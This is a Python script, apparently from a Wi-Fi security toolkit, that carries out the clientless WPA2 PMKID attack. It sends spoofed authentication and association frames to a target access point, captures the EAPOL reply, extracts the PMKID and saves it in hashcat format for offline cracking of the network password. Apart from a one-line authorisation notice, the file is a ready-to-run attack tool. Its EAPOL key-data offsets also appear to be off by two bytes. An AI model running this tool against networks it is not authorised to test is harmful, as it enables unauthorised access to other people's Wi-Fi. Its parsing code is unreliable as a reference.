#!/usr/bin/env python3
"""
PMKID Capture for Hoover WiFi Security Toolkit
Captures PMKID from the first EAPOL message of a WPA2 handshake.
Clientless attack technique — no connected clients needed.
Discovered by Jens "atom" Steube (hashcat developer).
"""

import argparse
import os
import subprocess
import sys
import threading
import time
from datetime import datetime
from typing import Optional

from scapy.layers.dot11 import Dot11, Dot11AssoReq, Dot11Auth, Dot11Elt, RadioTap
from scapy.layers.eap import EAPOL
from scapy.sendrecv import sendp, sniff
from scapy.utils import wrpcap

from utils import check_monitor_mode, require_root, setup_logging, validate_interface, validate_mac

# PMKID KDE constants
PMKID_KDE_TYPE = 0xDD
PMKID_KDE_OUI = b"\x00\x0f\xac"
PMKID_KDE_DATA_TYPE = 0x04
PMKID_LENGTH = 16


class PMKIDCapture:
    """Capture PMKID from WPA2 access points via EAPOL message 1.

    The AP sends the PMKID in the first EAPOL Key message in response
    to an authentication + association request. This allows offline
    cracking without needing a connected client.
    """

    def __init__(
        self,
        interface: str,
        target_bssid: str,
        channel: Optional[int] = None,
        output_dir: str = "captures",
        timeout: int = 60,
        client_mac: Optional[str] = None,
    ) -> None:
        self.interface: str = interface
        self.target_bssid: str = target_bssid.upper()
        self.channel: Optional[int] = channel
        self.output_dir: str = output_dir
        self.timeout: int = timeout
        self.client_mac: Optional[str] = client_mac.upper() if client_mac else None
        self.logger = setup_logging("pmkid_capture")
        self.pmkid: Optional[str] = None
        self.essid: Optional[str] = None
        self.eapol_frames: list = []
        self.capture_complete: bool = False
        self._stop_event = threading.Event()
        self._start_time: Optional[float] = None

    def _extract_pmkid(self, eapol_data: bytes) -> Optional[str]:
        """Parse EAPOL Key frame and extract PMKID from Key Data.

        The PMKID is located in the Key Data field as a KDE (Key Data
        Encapsulation) with:
          - Tag type: 0xDD
          - Length: 20 (OUI 3 + data type 1 + PMKID 16)
          - OUI: 00:0F:AC
          - Data Type: 04
          - Followed by 16 bytes of PMKID

        Args:
            eapol_data: Raw bytes of the EAPOL Key frame body.

        Returns:
            Hex string of the 16-byte PMKID, or None if not found.
        """
        i = 0
        while i < len(eapol_data) - 1:
            tag_type = eapol_data[i]
            if i + 1 >= len(eapol_data):
                break
            tag_len = eapol_data[i + 1]

            # Bounds check for the full tag
            if i + 2 + tag_len > len(eapol_data):
                break

            if tag_type == PMKID_KDE_TYPE and tag_len >= 20:
                tag_data = eapol_data[i + 2 : i + 2 + tag_len]
                # Check OUI (3 bytes) and data type (1 byte)
                if tag_data[:3] == PMKID_KDE_OUI and tag_data[3] == PMKID_KDE_DATA_TYPE:
                    pmkid_bytes = tag_data[4 : 4 + PMKID_LENGTH]
                    if len(pmkid_bytes) == PMKID_LENGTH:
                        pmkid_hex = pmkid_bytes.hex()
                        # Reject all-zero PMKIDs (AP doesn't support PMKID)
                        if pmkid_hex != "0" * 32:
                            return pmkid_hex

            i += 2 + tag_len

        return None

    def _send_association(self) -> None:
        """Send authentication + association request frames to trigger
        EAPOL message 1 from the AP.

        Sends an open-system authentication frame followed by an
        association request with RSN (WPA2) capabilities.
        """
        client = self.client_mac or "CC:CC:CC:CC:CC:CC"
        self.logger.info("Sending association request: %s -> %s", client, self.target_bssid)

        try:
            # Authentication frame (Open System)
            auth_frame = (
                RadioTap()
                / Dot11(
                    addr1=self.target_bssid,
                    addr2=client,
                    addr3=self.target_bssid,
                    type=0,
                    subtype=11,
                )
                / Dot11Auth(algo=0, seqnum=1, status=0)
            )
            sendp(auth_frame, iface=self.interface, verbose=False)
            self.logger.debug("Sent authentication frame")

            # Brief pause before association
            time.sleep(0.1)

            # Association request with RSN IE
            rsn_ie = (
                b"\x30"  # RSN element ID
                b"\x14"  # Length 20
                b"\x01\x00"  # Version 1
                b"\x00\x0f\xac\x04"  # Group cipher: CCMP
                b"\x01\x00"  # Pairwise cipher count: 1
                b"\x00\x0f\xac\x04"  # Pairwise cipher: CCMP
                b"\x01\x00"  # AKM count: 1
                b"\x00\x0f\xac\x02"  # AKM: PSK
                b"\x00\x00"  # RSN capabilities
            )

            assoc_frame = (
                RadioTap()
                / Dot11(
                    addr1=self.target_bssid,
                    addr2=client,
                    addr3=self.target_bssid,
                    type=0,
                    subtype=0,
                )
                / Dot11AssoReq(cap=0x1101, listen_interval=3)
                / Dot11Elt(ID=0, info=b"")
                / Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
            )

            # Append RSN IE as raw bytes
            raw_assoc = bytes(assoc_frame) + rsn_ie
            sendp(raw_assoc, iface=self.interface, verbose=False)
            self.logger.debug("Sent association request with RSN IE")

        except Exception as e:
            self.logger.warning("Error sending association frames: %s", e)

    def packet_handler(self, packet) -> None:
        """Process captured packets and extract PMKID from EAPOL Key frames.

        Filters for EAPOL packets from the target BSSID and attempts
        to extract the PMKID from the Key Data field.

        Args:
            packet: Scapy packet from sniff callback.
        """
        if not packet.haslayer(EAPOL):
            return

        try:
            if not packet.haslayer(Dot11):
                return

            dot11 = packet[Dot11]
            addrs = {str(getattr(dot11, f"addr{i}", "") or "").upper() for i in range(1, 4)}

            if self.target_bssid not in addrs:
                return

            self.eapol_frames.append(packet)
            src = str(dot11.addr2 or "").upper()
            dst = str(dot11.addr1 or "").upper()
            self.logger.info("EAPOL frame captured: %s -> %s", src, dst)

            # Check if this is from the AP (src == BSSID)
            if src != self.target_bssid:
                return

            # Try to extract raw EAPOL data for PMKID parsing
            eapol_layer = packet[EAPOL]
            raw_data = bytes(eapol_layer)

            # EAPOL Key frame: version(1) + type(1) + length(2) + descriptor(1)
            # + key_info(2) + key_length(2) + replay_counter(8) + nonce(32)
            # + key_iv(16) + key_rsc(8) + key_id(8) + key_mic(16)
            # + key_data_length(2) + key_data(variable)
            # Minimum EAPOL Key header is 99 bytes, Key Data starts at offset 99
            if len(raw_data) >= 99:
                key_data_len = int.from_bytes(raw_data[97:99], "big")
                if key_data_len > 0 and len(raw_data) >= 99 + key_data_len:
                    key_data = raw_data[99 : 99 + key_data_len]
                    pmkid = self._extract_pmkid(key_data)
                    if pmkid:
                        self.pmkid = pmkid
                        # Record the ESSID if available from Dot11Elt
                        if packet.haslayer(Dot11Elt):
                            try:
                                elt = packet[Dot11Elt]
                                if elt.ID == 0 and elt.info:
                                    self.essid = elt.info.decode("utf-8", errors="replace")
                            except Exception:
                                pass
                        self.capture_complete = True
                        self.logger.info("PMKID captured: %s", pmkid)
                        self._stop_event.set()

        except Exception as e:
            self.logger.debug("Error processing EAPOL packet: %s", e)

    def _set_channel(self, channel: int) -> None:
        """Set the wireless interface to the specified channel."""
        try:
            if validate_interface(self.interface):
                subprocess.run(
                    ["iwconfig", self.interface, "channel", str(channel)],
                    capture_output=True,
                    text=True,
                    timeout=5,
                )
                self.logger.info("Set channel to %d", channel)
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
            self.logger.warning("Could not set channel: %s", e)

    def start(self) -> bool:
        """Start PMKID capture: send association, sniff for EAPOL response.

        Returns:
            True if PMKID was successfully captured, False otherwise.
        """
        os.makedirs(self.output_dir, exist_ok=True)
        self._start_time = time.time()

        self.logger.info("Starting PMKID capture for %s", self.target_bssid)
        if self.client_mac:
            self.logger.info("Using client MAC: %s", self.client_mac)
        self.logger.info("Timeout: %ds", self.timeout)

        if self.channel:
            self._set_channel(self.channel)

        # Send association in a separate thread to trigger EAPOL msg 1
        assoc_thread = threading.Thread(target=self._send_association, daemon=True)
        assoc_thread.start()

        try:
            sniff(
                iface=self.interface,
                prn=self.packet_handler,
                stop_filter=lambda p: self._stop_event.is_set(),
                timeout=self.timeout,
                store=0,
            )
        except KeyboardInterrupt:
            self.logger.info("Capture interrupted by user")
        finally:
            self._stop_event.set()

        if self.capture_complete and self.pmkid:
            self.logger.info("PMKID successfully captured!")
        else:
            self.logger.warning(
                "Capture ended. %d EAPOL frames collected (no PMKID found)",
                len(self.eapol_frames),
            )

        return self.capture_complete

    def save_capture(self) -> Optional[str]:
        """Save PMKID in hashcat 22000 format.

        Format: WPA*02*<PMKID>*<AP_MAC>*<STA_MAC>*<ESSID_hex>***

        Returns:
            Path to the saved file, or None if no PMKID was captured.
        """
        if not self.pmkid:
            self.logger.warning("No PMKID to save")
            return None

        ap_mac = self.target_bssid.replace(":", "").lower()
        sta_mac = (self.client_mac or "CC:CC:CC:CC:CC:CC").replace(":", "").lower()
        essid_hex = (self.essid or "").encode("utf-8").hex()

        hashcat_line = f"WPA*02*{self.pmkid}*{ap_mac}*{sta_mac}*{essid_hex}***"

        bssid_safe = self.target_bssid.replace(":", "-")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"pmkid_{bssid_safe}_{timestamp}.22000"
        filepath = os.path.join(self.output_dir, filename)

        os.makedirs(self.output_dir, exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(hashcat_line + "\n")

        self.logger.info("PMKID saved to %s", filepath)
        self.logger.info("Hashcat format: %s", hashcat_line)

        # Also save raw EAPOL frames as pcap if we have any
        if self.eapol_frames:
            pcap_filename = f"pmkid_{bssid_safe}_{timestamp}.pcap"
            pcap_filepath = os.path.join(self.output_dir, pcap_filename)
            wrpcap(pcap_filepath, self.eapol_frames)
            self.logger.info("EAPOL frames saved to %s", pcap_filepath)

        return filepath

    def get_status(self) -> dict:
        """Return current capture status.

        Returns:
            Dictionary with capture state information.
        """
        elapsed = time.time() - self._start_time if self._start_time else 0
        return {
            "target_bssid": self.target_bssid,
            "client_mac": self.client_mac,
            "pmkid": self.pmkid,
            "capture_complete": self.capture_complete,
            "frames_captured": len(self.eapol_frames),
            "elapsed_time": round(elapsed, 1),
        }


def main() -> None:
    parser = argparse.ArgumentParser(
        description="PMKID Capture - Clientless WPA2 PMKID attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Capture PMKID from target AP
  sudo python3 pmkid_capture.py -i wlan0mon -b AA:BB:CC:DD:EE:FF -ch 6

  # Capture with custom client MAC
  sudo python3 pmkid_capture.py -i wlan0mon -b AA:BB:CC:DD:EE:FF --client-mac 11:22:33:44:55:66

  # Save to custom directory with longer timeout
  sudo python3 pmkid_capture.py -i wlan0mon -b AA:BB:CC:DD:EE:FF -o /tmp/pmkids -t 120

Note: Interface must be in monitor mode.
      Only use on networks you own or have authorization to test.
        """,
    )

    parser.add_argument(
        "-i", "--interface", required=True, help="Wireless interface in monitor mode"
    )
    parser.add_argument("-b", "--bssid", required=True, help="Target AP BSSID (MAC address)")
    parser.add_argument("-ch", "--channel", type=int, help="Channel to listen on")
    parser.add_argument(
        "-o", "--output-dir", default="captures", help="Output directory (default: captures)"
    )
    parser.add_argument(
        "-t", "--timeout", type=int, default=60, help="Capture timeout in seconds (default: 60)"
    )
    parser.add_argument("--client-mac", help="Client MAC to use for association (spoof)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    logger = setup_logging("pmkid_capture", verbose=args.verbose)
    require_root()

    if not validate_mac(args.bssid):
        logger.error("Invalid BSSID format: %s", args.bssid)
        sys.exit(1)

    if args.client_mac and not validate_mac(args.client_mac):
        logger.error("Invalid client MAC format: %s", args.client_mac)
        sys.exit(1)

    if not check_monitor_mode(args.interface):
        logger.warning("%s may not be in monitor mode", args.interface)
        response = input("Continue anyway? (y/N): ")
        if response.lower() != "y":
            sys.exit(1)

    capturer = PMKIDCapture(
        interface=args.interface,
        target_bssid=args.bssid,
        channel=args.channel,
        output_dir=args.output_dir,
        timeout=args.timeout,
        client_mac=args.client_mac,
    )

    success = capturer.start()
    filepath = capturer.save_capture()

    if success and filepath:
        print(f"\nPMKID captured and saved to: {filepath}")
    elif filepath:
        print(f"\nPartial data saved to: {filepath}")
    else:
        print("\nNo PMKID captured")

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
